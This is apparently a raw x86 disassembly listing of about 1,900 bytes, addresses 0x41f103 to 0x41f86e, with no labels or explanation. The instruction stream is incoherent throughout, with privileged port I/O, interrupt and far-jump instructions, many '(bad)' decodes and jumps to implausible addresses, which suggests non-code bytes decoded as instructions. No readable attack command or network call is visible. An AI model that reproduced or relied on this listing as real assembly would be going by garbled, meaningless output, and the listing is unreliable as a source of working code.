  41f103:	cmp    bh,BYTE PTR [eax+0x7069559d]
  41f109:	mov    eax,ds:0xcc7606c6
  41f10e:	jno    0x41f0b9
  41f110:	lock mov bh,0x9e
  41f113:	call   eax
  41f115:	shl    DWORD PTR [eax],0x83
  41f118:	mov    dh,BYTE PTR [edx]
  41f11a:	mov    ecx,0x59fff114
  41f11f:	mov    esi,DWORD PTR [ebx-0x6e]
  41f122:	mov    ebx,0x20220109
  41f127:	sti    
  41f128:	add    al,0x96
  41f12a:	sub    eax,0x7cd14f6c
  41f12f:	mov    ds:0x8a172998,al
  41f134:	add    ebx,ebp
  41f136:	or     eax,0xb25a05f0
  41f13b:	jnp    0x41f170
  41f13d:	jge    0x41f186
  41f13f:	jecxz  0x41f1a3
  41f141:	icebp  
  41f142:	mov    bh,0xc3
  41f144:	jl     0x41f153
  41f146:	pop    edi
  41f147:	andnps xmm2,XMMWORD PTR [ecx]
  41f14a:	add    BYTE PTR [ecx+esi*2],0xa
  41f14e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f14f:	mov    bh,0xc8
  41f151:	and    BYTE PTR [eax+0x3f08074e],dl
  41f157:	and    al,0xc6
  41f159:	or     BYTE PTR [ebp+edi*1-0x54],al
  41f15d:	int    0x45
  41f15f:	push   eax
  41f160:	push   0x9544262c
  41f165:	jmp    0xc96ccd81
  41f16a:	mov    al,ds:0xd48d7e83
  41f16f:	cld    
  41f170:	inc    edi
  41f171:	push   ds
  41f172:	xlat   BYTE PTR ds:[ebx]
  41f173:	sbb    ecx,esp
  41f175:	dec    edi
  41f176:	jge    0x41f1a7
  41f178:	jne    0x41f194
  41f17a:	push   ebx
  41f17b:	push   esi
  41f17c:	add    eax,0x8870d1aa
  41f181:	jnp    0x41f109
  41f183:	scas   al,BYTE PTR es:[edi]
  41f184:	and    al,0xcc
  41f186:	shl    BYTE PTR [edx-0x70bb4d60],1
  41f18c:	es aad 0x78
  41f18f:	lods   al,BYTE PTR ds:[esi]
  41f190:	out    dx,al
  41f191:	jne    0x41f153
  41f193:	and    ebx,DWORD PTR cs:[eax]
  41f196:	mov    ah,0xdb
  41f198:	pop    eax
  41f199:	popa   
  41f19a:	cwde   
  41f19b:	js     0x41f152
  41f19d:	inc    ebp
  41f19e:	sub    ebx,DWORD PTR [edx]
  41f1a0:	push   0x616cabb3
  41f1a5:	repz enter 0xc3a0,0x56
  41f1aa:	mov    BYTE PTR [eax-0x7a40a628],0x13
  41f1b1:	out    0xa,eax
  41f1b3:	addr16 in al,0x70
  41f1b6:	shr    DWORD PTR [edx+0x4b],0x29
  41f1ba:	sbb    DWORD PTR [eax*8-0x64d29fc9],ecx
  41f1c1:	cmc    
  41f1c2:	(bad)  
  41f1c4:	scas   eax,DWORD PTR es:[edi]
  41f1c5:	pusha  
  41f1c6:	popa   
  41f1c7:	addr16 call 0x616db5a0
  41f1cd:	cwde   
  41f1ce:	pop    eax
  41f1cf:	pushf  
  41f1d0:	sub    dh,BYTE PTR [ebp+0x1c]
  41f1d3:	nop
  41f1d4:	jmp    0x9b98:0xa32fe08d
  41f1db:	or     BYTE PTR [eax-0x6e],al
  41f1de:	scas   eax,DWORD PTR es:[edi]
  41f1df:	daa    
  41f1e0:	cwde   
  41f1e1:	lea    esi,es:[ebx+0x2c9b9846]
  41f1e8:	data16 fst DWORD PTR [ebx]
  41f1eb:	push   ss
  41f1ec:	push   DWORD PTR [edx-0x7b023933]
  41f1f2:	jbe    0x41f18a
  41f1f4:	fsub   st,st(5)
  41f1f6:	push   cs
  41f1f7:	dec    eax
  41f1f8:	mov    WORD PTR [edi+0x2100f7ac],ds
  41f1fe:	data16 xor al,0xd8
  41f201:	xor    al,0x54
  41f203:	loopne 0x41f261
  41f205:	call   0xc4cffb77
  41f20a:	lods   eax,DWORD PTR ds:[esi]
  41f20b:	or     edx,edi
  41f20d:	push   ss
  41f20e:	pop    eax
  41f20f:	xchg   ebp,eax
  41f210:	cdq    
  41f211:	mov    bh,0xce
  41f213:	jg     0x41f294
  41f215:	fsubrp st(1),st
  41f217:	js     0x41f214
  41f219:	iret   
  41f21a:	fcom   QWORD PTR [ebx-0x46ccc5a6]
  41f220:	lahf   
  41f221:	and    BYTE PTR [ebx+ecx*8],dh
  41f224:	jle    0x41f271
  41f226:	inc    eax
  41f227:	xor    edx,eax
  41f229:	mov    WORD PTR [edx-0x55fd506e],gs
  41f22f:	iret   
  41f230:	cmc    
  41f231:	arpl   WORD PTR [ebx+0x1210b6dd],bp
  41f237:	retf   
  41f238:	mov    esp,0x94e8a0cd
  41f23d:	inc    ebx
  41f23e:	aaa    
  41f23f:	push   eax
  41f240:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f241:	ss ins BYTE PTR es:[edi],dx
  41f243:	sbb    bh,BYTE PTR [edi-0x4c]
  41f246:	push   0x7d
  41f248:	pop    ds
  41f249:	adc    ebp,DWORD PTR [edx+ebp*2-0x48888e0d]
  41f250:	hlt    
  41f251:	jns    0x41f262
  41f253:	adc    al,BYTE PTR [eax]
  41f255:	daa    
  41f256:	dec    DWORD PTR ds:0x8a8b6ce2
  41f25c:	fisubr WORD PTR [eax-0xa]
  41f25f:	dec    eax
  41f260:	push   cs
  41f261:	stos   BYTE PTR es:[edi],al
  41f262:	inc    eax
  41f263:	inc    esp
  41f264:	fsub   st(2),st
  41f266:	mov    dh,0x77
  41f268:	pushf  
  41f269:	and    eax,0xc71b789c
  41f26e:	(bad)  
  41f271:	or     al,0x21
  41f273:	cmp    eax,0x1bb350b5
  41f278:	sti    
  41f279:	pop    esp
  41f27a:	jne    0x41f2ed
  41f27c:	push   es
  41f27d:	pop    edi
  41f27e:	add    cl,BYTE PTR [ebp+0x47a35a44]
  41f284:	or     al,0x63
  41f286:	je     0x41f257
  41f288:	add    DWORD PTR [ebx],esi
  41f28a:	mov    bl,0xd9
  41f28c:	(bad)  
  41f28d:	data16 jmp 0x41f2f3
  41f290:	repnz mov edi,0x695086db
  41f296:	fld    TBYTE PTR [edi+0x17]
  41f299:	int3   
  41f29a:	iret   
  41f29b:	loopne 0x41f2f8
  41f29d:	(bad)  
  41f29e:	stc    
  41f29f:	mov    al,0x14
  41f2a1:	pop    ss
  41f2a2:	mov    ds:0x324c7f71,al
  41f2a7:	mov    bl,0x92
  41f2a9:	xor    al,BYTE PTR [eax+ebp*1-0x2f3d2462]
  41f2b0:	int3   
  41f2b1:	pushf  
  41f2b2:	call   0x3bdc:0x8a88fcfc
  41f2b9:	mov    eax,ds:0x1c5ab309
  41f2be:	xchg   esi,eax
  41f2bf:	iret   
  41f2c0:	imul   ebx,DWORD PTR [esi+0x12],0x9b526127
  41f2c7:	neg    BYTE PTR ds:0x821875ee
  41f2cd:	xchg   BYTE PTR [esi-0x3608b59f],dh
  41f2d3:	adc    DWORD PTR gs:[edi-0x6a],esp
  41f2d7:	jge    0x41f2aa
  41f2d9:	jb     0x41f330
  41f2db:	icebp  
  41f2dc:	scas   al,BYTE PTR es:[edi]
  41f2dd:	mov    ebp,0x7e8a8c09
  41f2e2:	cmp    dl,ch
  41f2e4:	and    DWORD PTR ds:0x4afcc7ae,0x26
  41f2eb:	pusha  
  41f2ec:	push   edi
  41f2ed:	lahf   
  41f2ee:	pop    ebx
  41f2ef:	enter  0x4a2f,0x3a
  41f2f3:	mov    ebp,0x30b5e1ad
  41f2f8:	jle    0x41f333
  41f2fa:	jae    0x41f31a
  41f2fc:	test   esi,eax
  41f2fe:	fcmovne st,st(7)
  41f300:	adc    BYTE PTR [ebx-0x67c01540],dh
  41f306:	adc    al,0x8
  41f308:	sbb    edi,edx
  41f30a:	lea    esi,[ebp+0x1e76a45]
  41f310:	das    
  41f311:	(bad)  
  41f312:	cli    
  41f313:	(bad)  
  41f314:	cmp    al,0x74
  41f316:	out    dx,al
  41f317:	int    0x7
  41f319:	dec    edi
  41f31a:	dec    ebp
  41f31b:	mov    dh,0x9d
  41f31d:	iret   
  41f31e:	retf   
  41f31f:	addr16 cmc 
  41f321:	xor    esi,DWORD PTR [ecx]
  41f323:	add    ch,BYTE PTR [ecx-0x35]
  41f326:	(bad)  
  41f327:	int3   
  41f328:	leave  
  41f329:	mov    ebx,0x1c752b91
  41f32e:	mov    eax,ds:0xe1021f8c
  41f333:	push   edx
  41f334:	sti    
  41f335:	call   0xb21d:0xb426087a
  41f33c:	shl    bh,1
  41f33e:	lea    esi,[ebp+0x60]
  41f341:	dec    edi
  41f342:	ins    BYTE PTR es:[edi],dx
  41f343:	nop
  41f344:	xchg   ebp,eax
  41f345:	js     0x41f372
  41f347:	loopne 0x41f390
  41f349:	or     ebx,DWORD PTR [eax+0x45e2cedb]
  41f34f:	and    al,0x7
  41f351:	dec    eax
  41f352:	xchg   ebp,eax
  41f353:	pop    eax
  41f354:	sub    bl,BYTE PTR [edx-0xdf67d24]
  41f35a:	and    BYTE PTR [edi+eiz*2-0x2594d87c],0x51
  41f362:	call   0x597d:0xd2a79133
  41f369:	int    0x3c
  41f36b:	aam    0x2
  41f36d:	xchg   esi,eax
  41f36e:	xor    esp,edx
  41f370:	inc    ebp
  41f371:	push   cs
  41f372:	add    eax,0x5af7099a
  41f377:	xor    BYTE PTR [ebp-0x26012e14],0x37
  41f37e:	enter  0xb30f,0x50
  41f382:	adc    eax,0x892d5a5a
  41f387:	data16 stos BYTE PTR es:[edi],al
  41f389:	jle    0x41f36e
  41f38b:	ja     0x41f387
  41f38d:	mov    esp,0xb92f2fea
  41f392:	mov    ebx,0x42397ce7
  41f397:	retf   
  41f398:	out    dx,eax
  41f399:	ins    BYTE PTR es:[edi],dx
  41f39a:	sbb    dl,BYTE PTR [eax-0x3c]
  41f39d:	inc    ebx
  41f39e:	rcl    DWORD PTR [eax],1
  41f3a0:	inc    ecx
  41f3a1:	in     al,dx
  41f3a2:	mov    edi,?
  41f3a4:	aam    0xd
  41f3a6:	call   0x85f1b1ec
  41f3ab:	jl     0x41f352
  41f3ad:	jo     0x41f35e
  41f3af:	mov    al,0x44
  41f3b1:	out    dx,al
  41f3b2:	cwde   
  41f3b3:	repz push ss
  41f3b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f3b6:	jae    0x41f3a9
  41f3b8:	ja     0x41f422
  41f3ba:	jge    0x41f3ac
  41f3bc:	and    al,0x13
  41f3be:	imul   ebx,DWORD PTR [ebp+0x1b5f5a6e],0x51
  41f3c5:	repnz shl BYTE PTR [ebx+edi*1-0x5d],1
  41f3ca:	test   BYTE PTR [esi+0x2d5fa61c],dl
  41f3d0:	mov    esi,0x2c5b63df
  41f3d5:	(bad)  
  41f3d6:	in     al,0x2b
  41f3d8:	loopne 0x41f3d7
  41f3da:	mov    ah,BYTE PTR [ecx-0x11]
  41f3dd:	dec    ecx
  41f3de:	cmp    DWORD PTR [ecx-0x4a8e3bb3],0xe8235537
  41f3e8:	rol    DWORD PTR [eax-0x17],cl
  41f3eb:	fild   WORD PTR [esi]
  41f3ed:	push   esi
  41f3ee:	addr16 xor eax,0xa739db35
  41f3f4:	sub    BYTE PTR [esp+edi*1+0x3],dl
  41f3f8:	out    dx,eax
  41f3f9:	mov    cl,0x72
  41f3fb:	popw   es
  41f3fd:	in     eax,0xb6
  41f3ff:	stos   DWORD PTR es:[edi],eax
  41f400:	rcr    DWORD PTR [edx+0x4f],0x31
  41f404:	fisubr DWORD PTR [ebx-0x35]
  41f407:	jmp    0x41f3a5
  41f409:	scas   eax,DWORD PTR es:[edi]
  41f40a:	loope  0x41f3aa
  41f40c:	cs inc ecx
  41f40e:	and    eax,0x18c73020
  41f413:	call   0x61e7:0x424da9b4
  41f41a:	pop    ebp
  41f41b:	inc    esp
  41f41c:	inc    ebp
  41f41d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f41e:	mov    ds:0x59e5d994,al
  41f423:	mov    BYTE PTR ss:0xdc43782c,bh
  41f42a:	or     edx,DWORD PTR [edx+0x189c8671]
  41f430:	mov    eax,0x63721cdb
  41f435:	lods   eax,DWORD PTR ds:[esi]
  41f436:	adc    ebx,DWORD PTR ds:0xad3317b6
  41f43c:	icebp  
  41f43d:	jns    0x41f491
  41f43f:	lds    esi,FWORD PTR [edx]
  41f441:	sbb    ecx,DWORD PTR [esi]
  41f443:	adc    eax,0xbc38d905
  41f448:	inc    edx
  41f449:	hlt    
  41f44a:	sbb    al,BYTE PTR [edx]
  41f44c:	xchg   BYTE PTR [eax-0x66],ah
  41f44f:	shr    DWORD PTR ds:0x888b898a,cl
  41f455:	pop    es
  41f456:	leave  
  41f457:	ss cli 
  41f459:	xchg   DWORD PTR [ecx],ebp
  41f45b:	dec    ecx
  41f45c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f45d:	(bad)  
  41f45e:	jmp    0x41f451
  41f460:	sub    DWORD PTR [eax],esi
  41f462:	push   es
  41f463:	inc    ecx
  41f464:	arpl   cx,sp
  41f466:	int    0x36
  41f468:	loopne 0x41f46c
  41f46a:	pop    esp
  41f46b:	mov    dh,0xee
  41f46d:	fnsave [esi+0x7215e577]
  41f473:	loop   0x41f425
  41f475:	xchg   edx,eax
  41f476:	sti    
  41f477:	sti    
  41f478:	dec    ebx
  41f479:	nop
  41f47a:	test   eax,0x4fe8c50
  41f47f:	(bad)  [esi]
  41f481:	xchg   esp,eax
  41f482:	imul   ebp,DWORD PTR [edx+0x233b57fb],0xb024b06c
  41f48c:	lock dec ecx
  41f48e:	inc    ecx
  41f48f:	jns    0x41f4b9
  41f491:	sbb    BYTE PTR [ecx],al
  41f493:	xlat   BYTE PTR ds:[ebx]
  41f494:	mov    cs,edx
  41f496:	fwait
  41f497:	and    eax,0x4edab1b4
  41f49c:	lods   eax,DWORD PTR ds:[esi]
  41f49d:	dec    esi
  41f49e:	push   0x2d
  41f4a0:	(bad)  
  41f4a1:	cmp    BYTE PTR [eax],bl
  41f4a3:	and    esp,DWORD PTR [ebx+ebx*1]
  41f4a6:	bound  ebp,QWORD PTR [esi+ebx*8]
  41f4a9:	mov    WORD PTR [ebx],?
  41f4ab:	cmp    eax,0x8290fadc
  41f4b0:	(bad)  
  41f4b1:	jae    0x41f435
  41f4b3:	iret   
  41f4b4:	stos   BYTE PTR es:[edi],al
  41f4b5:	dec    ecx
  41f4b6:	dec    esp
  41f4b7:	rol    DWORD PTR [edi],cl
  41f4b9:	jmp    0xe627:0x3f573bb5
  41f4c0:	dec    esp
  41f4c1:	cmp    BYTE PTR [eax+0x69],ch
  41f4c4:	push   edx
  41f4c5:	(bad)  [eax]
  41f4c7:	jmp    0x452e212d
  41f4cc:	call   0xd0868ab0
  41f4d1:	std    
  41f4d2:	cwde   
  41f4d3:	and    cl,BYTE PTR [ecx-0x13ca2108]
  41f4d9:	inc    ebp
  41f4da:	or     eax,0x3ed6c03d
  41f4df:	or     BYTE PTR [edx+eiz*4+0x101e10a5],0x62
  41f4e7:	add    al,0xf2
  41f4e9:	xlat   BYTE PTR ds:[ebx]
  41f4ea:	xchg   ebx,eax
  41f4eb:	inc    ecx
  41f4ec:	jl     0x41f4c1
  41f4ee:	push   edx
  41f4ef:	scas   eax,DWORD PTR es:[edi]
  41f4f0:	mov    bl,0x80
  41f4f2:	and    BYTE PTR [esp+ebp*1],dh
  41f4f5:	sub    bh,BYTE PTR [eax+0x2a]
  41f4f8:	add    DWORD PTR [edi+ebx*2+0x59],esi
  41f4fc:	dec    ebp
  41f4fd:	hlt    
  41f4fe:	popf   
  41f4ff:	fs jg  0x41f524
  41f502:	in     al,0x79
  41f504:	ss inc edx
  41f506:	xchg   DWORD PTR ds:0x9ec20f0a,ecx
  41f50c:	ret    0xfbcd
  41f50f:	dec    edx
  41f510:	jae    0x41f4ad
  41f512:	lea    edx,[ebp+0x48ed28d5]
  41f518:	(bad)  
  41f519:	cli    
  41f51a:	outs   dx,DWORD PTR ds:[esi]
  41f51b:	xor    ebx,ecx
  41f51d:	mov    bh,0x78
  41f51f:	fnsave [esi]
  41f521:	mov    ah,0x3d
  41f523:	fadd   DWORD PTR [edi-0x50]
  41f526:	and    DWORD PTR [edi],edx
  41f528:	es repnz mov esi,0x5ac39566
  41f52f:	xchg   ecx,eax
  41f530:	sbb    eax,0x59de91b9
  41f535:	fnstcw WORD PTR es:[esi+0x54394f07]
  41f53c:	inc    eax
  41f53d:	retfw  0xb7
  41f541:	and    BYTE PTR [eax],cl
  41f543:	jo     0x41f591
  41f545:	out    dx,eax
  41f546:	iret   
  41f547:	js     0x41f530
  41f549:	sub    ah,BYTE PTR [ebp-0xa7c40b0]
  41f54f:	push   esp
  41f550:	xor    ebx,edi
  41f552:	(bad)  
  41f553:	mov    edi,0x69fae768
  41f558:	mov    dl,0x32
  41f55a:	push   ecx
  41f55b:	add    edi,DWORD PTR [edx-0x43]
  41f55e:	mov    ecx,0xca001ffd
  41f563:	retf   
  41f564:	popa   
  41f565:	loopne 0x41f576
  41f567:	push   es
  41f568:	mov    esp,0x87960f27
  41f56d:	mov    edi,0xe73596c0
  41f572:	xlat   BYTE PTR ds:[ebx]
  41f573:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f574:	xor    al,0x3d
  41f576:	loop   0x41f5e9
  41f578:	call   0x7b01:0xe7b29e4e
  41f57f:	cmp    ebp,DWORD PTR [ecx+0x36]
  41f582:	mov    eax,0xfa19148
  41f587:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f588:	fistp  DWORD PTR [esi]
  41f58a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f58b:	dec    ecx
  41f58c:	ror    al,cl
  41f58e:	stc    
  41f58f:	jl     0x41f5a2
  41f591:	cmp    al,0x14
  41f593:	hlt    
  41f594:	cmp    BYTE PTR [ebx],ch
  41f596:	pop    ebx
  41f597:	pushf  
  41f598:	fcmove st,st(3)
  41f59a:	sbb    DWORD PTR [ebp-0x7af9fa7e],ebp
  41f5a0:	sbb    BYTE PTR [edi],bh
  41f5a2:	sub    ebx,DWORD PTR [edx-0x460745af]
  41f5a8:	into   
  41f5a9:	lea    ebx,[ecx+0x41c27a76]
  41f5af:	test   BYTE PTR [esi],bl
  41f5b1:	sub    DWORD PTR [eax],eax
  41f5b3:	in     al,0x3f
  41f5b5:	fidivr WORD PTR [ebx-0x1c]
  41f5b8:	mov    al,0xb2
  41f5ba:	in     al,dx
  41f5bb:	cld    
  41f5bc:	out    0xcc,eax
  41f5be:	sbb    edx,DWORD PTR [eax-0x602f1e69]
  41f5c4:	mov    dl,0x13
  41f5c6:	adc    BYTE PTR [edi-0xb272b2a],dl
  41f5cc:	mov    esi,fs
  41f5ce:	test   DWORD PTR [esi+0x27],esi
  41f5d1:	aas    
  41f5d2:	xchg   BYTE PTR [ecx-0x233f5489],dh
  41f5d8:	sbb    cl,BYTE PTR [edx]
  41f5da:	mov    ds:0xb461d34e,eax
  41f5df:	ss retf 
  41f5e1:	mov    ds:0xd63dd9b2,eax
  41f5e6:	std    
  41f5e7:	lods   eax,DWORD PTR ds:[esi]
  41f5e8:	inc    ebp
  41f5e9:	adc    eax,0xf3aa7df3
  41f5ee:	(bad)  
  41f5ef:	fwait
  41f5f0:	cmp    BYTE PTR [ecx],0x9c
  41f5f3:	pop    esp
  41f5f4:	sub    dl,BYTE PTR [ecx]
  41f5f6:	mov    ds:0x55253180,eax
  41f5fb:	jbe    0x41f62c
  41f5fd:	mov    al,0x6c
  41f5ff:	push   edx
  41f600:	pushf  
  41f601:	ds and al,0x12
  41f604:	lea    eax,[eax]
  41f606:	fst    DWORD PTR [eax+ebx*4]
  41f609:	sub    eax,0xb00905ef
  41f60e:	loopne 0x41f629
  41f610:	ret    0xc037
  41f613:	sbb    BYTE PTR [edx+0xecf7728],bl
  41f619:	test   BYTE PTR [esi-0x13],ah
  41f61c:	cmp    eax,0xd33c4ff4
  41f621:	xchg   esp,eax
  41f622:	lea    ebx,[edi]
  41f624:	cld    
  41f625:	dec    ebp
  41f626:	cmp    DWORD PTR [esi+edi*8+0x41],ebp
  41f62a:	int3   
  41f62b:	cld    
  41f62c:	push   0xb39679f8
  41f631:	add    eax,0x22e35905
  41f636:	nop
  41f637:	jno    0x41f6aa
  41f639:	jle    0x41f6a3
  41f63b:	xchg   ecx,eax
  41f63c:	fbstp  TBYTE PTR [eax+0x6f]
  41f63f:	adc    BYTE PTR [edx+0x26],0xb2
  41f643:	sub    al,ch
  41f645:	fwait
  41f646:	dec    edx
  41f647:	sub    ch,bh
  41f649:	imul   ebp,DWORD PTR [eax+0x1cdd54d4],0x6f
  41f650:	lds    ebx,FWORD PTR [esi]
  41f652:	mov    dh,0xb9
  41f654:	xchg   ebx,eax
  41f655:	push   ecx
  41f656:	repnz aaa 
  41f658:	pusha  
  41f659:	mov    dl,0xbf
  41f65b:	loop   0x41f5fc
  41f65d:	imul   edx,DWORD PTR [esi+0x3d],0xffffffde
  41f661:	pop    esp
  41f662:	dec    ecx
  41f663:	mov    esi,0x6557d999
  41f668:	jge    0x41f671
  41f66a:	push   edi
  41f66b:	pop    es
  41f66c:	pusha  
  41f66d:	push   es
  41f66e:	fimul  DWORD PTR [ecx-0x79]
  41f671:	out    dx,al
  41f672:	fstp   QWORD PTR [ecx+0x75]
  41f675:	iret   
  41f676:	sti    
  41f677:	fnsave [edi+0x5f]
  41f67a:	es fdivrp st(1),st
  41f67d:	(bad)  
  41f67e:	dec    esp
  41f67f:	push   es
  41f680:	sub    eax,0x11ac78a9
  41f685:	mov    bl,0x57
  41f687:	xchg   DWORD PTR [esi+0xe],ecx
  41f68a:	xchg   DWORD PTR [ecx+0x743fae9b],esi
  41f690:	add    ebp,DWORD PTR [ebp-0x33]
  41f693:	adc    al,0x31
  41f695:	(bad)  
  41f697:	pushf  
  41f698:	sahf   
  41f699:	cs push cs
  41f69b:	mov    dl,0x52
  41f69d:	mov    ecx,0x9f94622
  41f6a3:	xchg   ebp,eax
  41f6a4:	shl    DWORD PTR [edi],cl
  41f6a6:	sbb    DWORD PTR [esp+ecx*8-0x6b26a5b4],0xbb31886a
  41f6b1:	(bad)  [ecx+ecx*4]
  41f6b4:	mov    edi,0xd3908ef1
  41f6b9:	in     al,dx
  41f6ba:	cmp    edi,DWORD PTR [ebp+0x307e0136]
  41f6c0:	sub    bl,BYTE PTR [ebx-0x3f]
  41f6c3:	mov    dl,0xac
  41f6c5:	loop   0x41f667
  41f6c7:	gs pop edx
  41f6c9:	xchg   ecx,eax
  41f6ca:	es push esp
  41f6cc:	ja     0x41f6c5
  41f6ce:	and    bl,BYTE PTR [eax]
  41f6d0:	retf   
  41f6d1:	push   ebx
  41f6d2:	add    DWORD PTR [esi],esi
  41f6d4:	mov    ah,0x78
  41f6d6:	stos   BYTE PTR es:[edi],al
  41f6d7:	or     al,0x73
  41f6d9:	pop    es
  41f6da:	mov    bh,bl
  41f6dc:	or     DWORD PTR [edi-0x7076f5da],ecx
  41f6e2:	ins    BYTE PTR es:[edi],dx
  41f6e3:	retf   
  41f6e4:	das    
  41f6e5:	iret   
  41f6e6:	sub    ah,BYTE PTR [edi+0x63]
  41f6e9:	and    edx,DWORD PTR [edx-0x80]
  41f6ec:	jle    0x41f6aa
  41f6ee:	lods   al,BYTE PTR ds:[esi]
  41f6ef:	mov    eax,DWORD PTR [ecx-0x414b8fc1]
  41f6f5:	or     cl,BYTE PTR [eax+0x7]
  41f6f8:	push   ss
  41f6f9:	adc    al,0x10
  41f6fb:	adc    DWORD PTR [edx+0x7af385c6],eax
  41f701:	mov    ch,0xaa
  41f703:	add    dl,dh
  41f705:	add    al,BYTE PTR [eax-0x43]
  41f708:	inc    ebx
  41f709:	in     eax,0x2
  41f70b:	add    DWORD PTR [ebp-0x7836c4],edx
  41f711:	sbb    al,0x1f
  41f713:	lods   eax,DWORD PTR ds:[esi]
  41f714:	or     ecx,0x5dcd0d1f
  41f71a:	mov    ah,0xa7
  41f71d:	dec    edi
  41f71e:	add    DWORD PTR [edi],0xd345ecf8
  41f724:	inc    eax
  41f725:	push   cs
  41f726:	stos   BYTE PTR es:[edi],al
  41f727:	pusha  
  41f728:	retf   0x5483
  41f72b:	ret    
  41f72c:	or     al,0x19
  41f72e:	fimul  DWORD PTR [ecx-0x58738849]
  41f734:	and    ecx,DWORD PTR [eax+ebx*8]
  41f737:	imul   eax,esi,0x63
  41f73a:	push   eax
  41f73b:	xlat   BYTE PTR ds:[ebx]
  41f73c:	cld    
  41f73d:	out    0x50,eax
  41f73f:	rol    DWORD PTR [edi],1
  41f741:	xchg   ebx,eax
  41f742:	nop
  41f743:	dec    ebp
  41f744:	js     0x41f718
  41f746:	and    al,0x51
  41f748:	cmp    eax,0xbcbc879e
  41f74d:	hlt    
  41f74e:	daa    
  41f74f:	xchg   ebx,eax
  41f750:	out    dx,al
  41f751:	jae    0x41f718
  41f753:	lods   eax,DWORD PTR ds:[esi]
  41f754:	js     0x41f751
  41f756:	mov    ecx,0xb8e98707
  41f75b:	pop    ebx
  41f75c:	sub    ecx,esp
  41f75e:	mov    dl,BYTE PTR ss:[edx]
  41f761:	repnz aaa 
  41f763:	xchg   ecx,eax
  41f764:	pushf  
  41f765:	mov    eax,0xe50cf832
  41f76a:	in     al,0xae
  41f76c:	arpl   WORD PTR [edi+0x72],si
  41f76f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f770:	cdq    
  41f771:	jg     0x41f708
  41f773:	(bad)  
  41f774:	int3   
  41f775:	leave  
  41f776:	sub    ch,BYTE PTR [edx+0x63b9d198]
  41f77c:	adc    ecx,DWORD PTR [esi]
  41f77e:	mov    esi,0x13298da2
  41f783:	push   ss
  41f784:	mov    edi,ebx
  41f786:	jge    0x41f70c
  41f788:	jo     0x41f726
  41f78a:	xor    dl,BYTE PTR [ebx]
  41f78c:	nop
  41f78d:	scas   eax,DWORD PTR es:[edi]
  41f78e:	sbb    BYTE PTR [edi-0xedd0b54],dl
  41f794:	test   BYTE PTR ds:0xdfb98ba7,bl
  41f79a:	pop    edx
  41f79b:	test   DWORD PTR [ecx+0xc],edx
  41f79e:	sbb    edx,DWORD PTR [eax]
  41f7a0:	(bad)  
  41f7a2:	inc    ebp
  41f7a3:	sub    BYTE PTR [edx+0x4d],al
  41f7a6:	cli    
  41f7a7:	mov    ebx,0xec31493f
  41f7ac:	sub    al,0xfd
  41f7ae:	fstp   DWORD PTR [ebx+0x71]
  41f7b1:	pop    edi
  41f7b2:	xchg   ebp,eax
  41f7b3:	cmp    eax,0x9d7a6909
  41f7b8:	dec    esp
  41f7b9:	and    DWORD PTR [edi+0x7a],eax
  41f7bc:	ss stos DWORD PTR es:[edi],eax
  41f7be:	mov    ss,edi
  41f7c0:	outs   dx,BYTE PTR ds:[esi]
  41f7c1:	cmp    ecx,DWORD PTR [edx]
  41f7c3:	pop    edx
  41f7c4:	xchg   edx,eax
  41f7c5:	or     al,BYTE PTR [ebx]
  41f7c7:	adc    cl,BYTE PTR ds:[ebp-0x28249c6]
  41f7ce:	push   0x12
  41f7d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f7d1:	pop    esi
  41f7d2:	fsubrp st(4),st
  41f7d4:	ret    
  41f7d5:	in     al,0x40
  41f7d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7d8:	aaa    
  41f7d9:	jbe    0x41f801
  41f7db:	sti    
  41f7dc:	pop    es
  41f7dd:	out    dx,eax
  41f7de:	shl    ebp,cl
  41f7e0:	jge    0x41f7c4
  41f7e2:	dec    ecx
  41f7e3:	mov    ebp,ecx
  41f7e5:	rcr    BYTE PTR [edi],1
  41f7e7:	in     eax,dx
  41f7e8:	test   eax,0x5d63708a
  41f7ed:	loop   0x41f85c
  41f7ef:	js     0x41f776
  41f7f1:	add    BYTE PTR [edi],dh
  41f7f3:	outs   dx,DWORD PTR ds:[esi]
  41f7f4:	aaa    
  41f7f5:	and    al,0x93
  41f7f7:	mov    esp,0x3fb36aa0
  41f7fc:	hlt    
  41f7fd:	add    al,0xbe
  41f7ff:	lods   eax,DWORD PTR ds:[esi]
  41f800:	or     BYTE PTR [ebx],cl
  41f802:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f803:	cmp    bh,bl
  41f805:	sbb    esp,DWORD PTR [edx]
  41f807:	inc    ebp
  41f808:	sti    
  41f809:	sub    bh,bl
  41f80b:	adc    DWORD PTR [ebx-0x500c212f],esp
  41f811:	leave  
  41f812:	rcl    DWORD PTR [edi+0x4d25d922],cl
  41f818:	mov    ecx,0x82b12b0a
  41f81d:	sub    al,BYTE PTR [edi]
  41f81f:	sub    DWORD PTR [edi],edx
  41f821:	xor    eax,0x4a5337a7
  41f826:	xlat   BYTE PTR ds:[ebx]
  41f827:	scas   al,BYTE PTR es:[edi]
  41f828:	aas    
  41f829:	sub    DWORD PTR [eax],ebp
  41f82b:	cmp    DWORD PTR [ebx+0x1ec610ff],esi
  41f831:	or     al,0x12
  41f833:	cmp    esp,DWORD PTR ds:0xf1516a42
  41f839:	sbb    eax,edx
  41f83b:	or     al,0xcf
  41f83d:	and    BYTE PTR [ecx+ebx*2],0x68
  41f841:	fwait
  41f842:	mov    esp,DWORD PTR [edx+0x4e665760]
  41f848:	fadd   st,st(6)
  41f84a:	jbe    0x41f7da
  41f84c:	jmp    0x849dc195
  41f851:	jmp    0x41f867
  41f853:	inc    ebx
  41f854:	out    dx,eax
  41f855:	repz std 
  41f857:	or     edi,ecx
  41f859:	jmp    0x995b6e51
  41f85e:	ret    0xfd8a
  41f861:	mov    bl,0xe6
  41f863:	xor    eax,0xc0bf519
  41f868:	jne    0x41f899
  41f86a:	int3   
  41f86b:	sti    
  41f86c:	es stos DWORD PTR es:[edi],eax
  41f86e:	popf   
